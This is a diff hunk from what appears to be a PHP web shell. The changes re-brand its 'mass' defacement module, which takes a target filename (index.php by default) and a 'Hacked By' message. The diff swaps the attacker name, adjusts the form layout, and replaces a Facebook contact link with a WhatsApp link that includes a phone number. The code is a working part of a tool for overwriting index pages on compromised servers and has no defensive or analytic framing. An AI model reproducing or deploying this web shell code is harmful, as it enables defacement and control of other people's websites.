@@ -184,10 +184,10 @@ elseif($_GET['go'] == 'mass'){
 	<font style='text-decoration: underline;'>Filename:</font><br>
 	<input type='text' name='d_file' value='index.php' style='width: 300px;' height='10'><br>
 	<font style='text-decoration: underline;'>Index File:</font><br>
-	<textarea name='script' style='width: 450px; height: 300px;'>Hacked By ./GH05TW1BL3 | GARUDA TERSAKTI 72</textarea><br>
+	<textarea name='script' style='width: 300px; height: 300px;'>Hacked By Rizredvlo7zer0✬ | GARUDA TERSAKTI 72</textarea><br>
 	<input type='submit' name='start' value='Goo!' style='width: 300px;' class='btn btn-success btn-sm'>
 	</form>";
-		echo"<u><a href='http://facebook.com/Tubagus19.id' target='_blank'>Say hello to me :)</a><u/></center>";
+		echo"<u><a href='https://api.whatsapp.com/send?phone=6285745620638&text=' target='_blank'>Say hello to me :)</a><u/></center>";
 	}
 }
 elseif($_GET['go'] == 'delet') {
